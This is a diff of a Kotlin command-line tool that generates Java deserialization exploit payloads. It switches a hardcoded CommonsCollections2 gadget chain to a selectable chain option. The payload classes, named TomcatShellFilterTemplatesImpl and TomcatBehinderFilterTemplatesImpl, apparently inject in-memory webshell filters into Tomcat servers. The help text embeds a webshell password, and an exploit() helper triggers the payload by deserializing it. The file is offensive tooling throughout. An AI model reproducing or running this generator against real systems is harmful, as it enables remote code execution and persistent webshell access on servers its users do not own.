@@ -10,23 +10,25 @@ import java.util.Base64
 
 object App : CliktCommand(printHelpOnEmptyArgs = true) {
 
+    private val chain by option().enum<Chain>().required()
+
     private val payload by option(help = "Password: xhstormr").enum<Payload>().required()
 
     override fun run() {
-        // exploit(CommonsCollections2ObjectPayload, clazz<TomcatShellFilterTemplatesImpl>())
-        // exploit(CommonsCollections2ObjectPayload, clazz<TomcatBehinderFilterTemplatesImpl>())
+        // exploit(Chain.CommonsCollections2Chain, clazz<TomcatShellFilterTemplatesImpl>())
+        // exploit(Chain.CommonsCollections2Chain, clazz<TomcatBehinderFilterTemplatesImpl>())
 
-        CommonsCollections2ObjectPayload
-            .getObject(payload.clazz)
+        chain
+            .generate(payload.clazz)
             .serialize(System.out)
     }
 }
 
 fun main(args: Array<String>) = App.main(args)
 
-fun exploit(payload: ObjectPayload, clazz: Class<*>) {
+fun exploit(chain: Chain, payload: Class<*>) {
     try {
-        val any = payload.getObject(clazz)
+        val any = chain.generate(payload)
         println(any)
         ObjectInputStream(ByteArrayInputStream(any.serialize()))
             .readObject()
